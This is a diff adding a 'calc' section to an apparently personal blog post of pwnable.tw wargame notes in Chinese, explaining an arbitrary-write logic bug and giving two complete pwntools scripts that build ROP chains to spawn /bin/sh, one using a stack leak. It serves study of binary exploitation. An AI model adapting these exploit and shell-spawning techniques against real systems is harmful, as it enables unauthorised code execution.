@@ -1,5 +1,6 @@
 ---
 title: pwnable.tw练习
+abbrlink: 4968
 date: 2018-12-01 17:50:59
 tags:
 ---
@@ -461,5 +462,202 @@ if __name__ == "__main__":
     main()
 ```
 
+# calc
 
+32位:
+
+```
+eax=11
+ebx=“/bin/sh”字符串的地址
+ecx=0
+edx=0
+int 0x80
+```
+
+64位:
+
+```
+rax=0x3b
+rdi="/bin/sh"字符串地址
+rsi=0
+rdx=0
+syscall
+```
+
+示例: http://eternalsakura13.com/2018/04/27/star_primepwn/
+
+首先定义一个struct:
+
+![](/assets/pwnabletw/TIM截图20181203173044.png)
+
+然后倒入数据结构：
+
+![](/assets/pwnabletw/TIM截图20181203173225.png)
+
+逻辑漏洞:当输入表达式第一位就是符号的时候，就会修改buff->buff_size, 由于buf->buff_size可以被控制，所以执行eval的时候，会造成任意地址写。
+
+![](/assets/pwnabletw/TIM截图20181203173256.png)
+
+## rop不需要leak
+
+```
+from pwn import *
+
+debug = int(raw_input("debug?:"))
+
+if debug:
+    p = process("./calc")
+    context.log_level = "debug"
+else:
+    p = remote("chall.pwnable.tw", 10100)
+
+
+def get_val(value):
+    value = int(value)
+    if value < 0:
+        return value & 0xffffffff
+    else:
+        return value
+
+current_val = {}
+
+def write(addr, content):
+    p.sendline("+" + str(addr))
+    current_val = get_val(p.recvline()[:-1])
+    p.info('current {} = {}'.format(addr, hex(current_val)))
+    
+    payload = "+" + str(addr)
+    val = content - current_val
+    if addr == 363:
+        print val
+    if val < 0:
+        payload += '-' + str(abs(val))
+    elif val > 0x7fffffff:
+        payload += '-' + str(0xffffffff - val + 1)
+    else:
+        payload += '+' + str(val)
+    p.sendline(payload)
+    received = get_val(p.recvline()[:-1])
+    if received != content:
+        p.info('not right!')
+        raise Exception('not successful')
+
+# 361 ret_addr 
+p.recvuntil("===\n")
+
+rop = [
+  0x080701aa, # pop edx ; ret
+  0x080ec060, # @ .data
+  0x0805c34b, # pop eax ; ret
+  u32('/bin'),
+  0x0809b30d, # mov dword ptr [edx], eax ; ret
+  0x080701aa, # pop edx ; ret
+  0x080ec064, # @ .data + 4
+  0x0805c34b, # pop eax ; ret
+  u32('/sh\x00'),
+  0x0809b30d, # mov dword ptr [edx], eax ; ret
+  0x080701aa, # pop edx ; ret
+  0x080ec068, # @ .data + 8                    # edx = 0
+  0x080550d0, # xor eax, eax ; ret
+  0x0809b30d, # mov dword ptr [edx], eax ; ret # @.data+8 = 0 
+  0x080701d1, # pop ecx ; pop ebx ; ret        # ecx = 0, ebx= '/bin/sh' address
+  0x080ec068, # @ .data + 8
+  0x080ec060, # @ .data
+  0x0805c34b, # pop eax ; ret            # eax = 0xb
+  0xb,
+  0x08049a21 # int 0x80
+]
+
+index = 361
+for i in rop:
+    write(index, i)
+    index += 1
+
+p.sendline("end")
+p.interactive()
+```
+
+## rop需要leak
+
+```
+from pwn import *
+
+debug = int(raw_input("debug?:"))
+
+if debug:
+    p = process("./calc")
+    context.log_level = "debug"
+else:
+    p = remote("chall.pwnable.tw", 10100)
+
+
+def get_val(value):
+    value = int(value)
+    if value < 0:
+        return value & 0xffffffff
+    else:
+        return value
+
+current_val = {}
+
+def write(addr, content):
+    p.sendline("+" + str(addr))
+    current_val = get_val(p.recvline()[:-1])
+    p.info('current {} = {}'.format(addr, hex(current_val)))
+    
+    payload = "+" + str(addr)
+    val = content - current_val
+    if addr == 363:
+        print val
+    if val < 0:
+        payload += '-' + str(abs(val))
+    elif val > 0x7fffffff:
+        payload += '-' + str(0xffffffff - val + 1)
+    else:
+        payload += '+' + str(val)
+    p.sendline(payload)
+    received = get_val(p.recvline()[:-1])
+    if received != content:
+        p.info('not right!')
+        raise Exception('not successful')
+
+# 360 ebp
+# 361 ret_addr 
+p.recvuntil("===\n")
+
+#leak stack
+p.sendline("+360")
+stack_leak = get_val(p.recvline()[:-1])
+start_pos = stack_leak - 0x20
+p.info('current {} = {}'.format(360, hex(start_pos)))
+
+# +361 -> return_address
+# stack:
+# 360 => start_pos(leaked)
+# 361 => 0x080701d1 : pop ecx ; pop ebx ; ret
+# 362 => 0
+# 363 => ebx : start_pos + 36
+# 364 => 0x0805c34b : pop eax ; ret
+# 365 => eax : 0xb
+# 366 => 0x080701aa : pop edx ; ret
+# 367 => 0
+# 368 => 0x08049a21 : int 0x80
+# 369 => 0x6e69622f /bin/sh\x00
+# 370 => 0x68732f
+
+write(361, 0x080701d1)
+#write(362, start_pos + 36)
+write(362, 0)
+write(363, start_pos + 36)
+write(364, 0x0805c34b)
+write(365, 0xb)
+write(366, 0x080701aa)
+write(367, 0x0)
+write(368, 0x08049a21)
+write(369, 0x6e69622f)
+write(370, 0x68732f)
+
+p.sendline("end")
+p.interactive()
+```
 
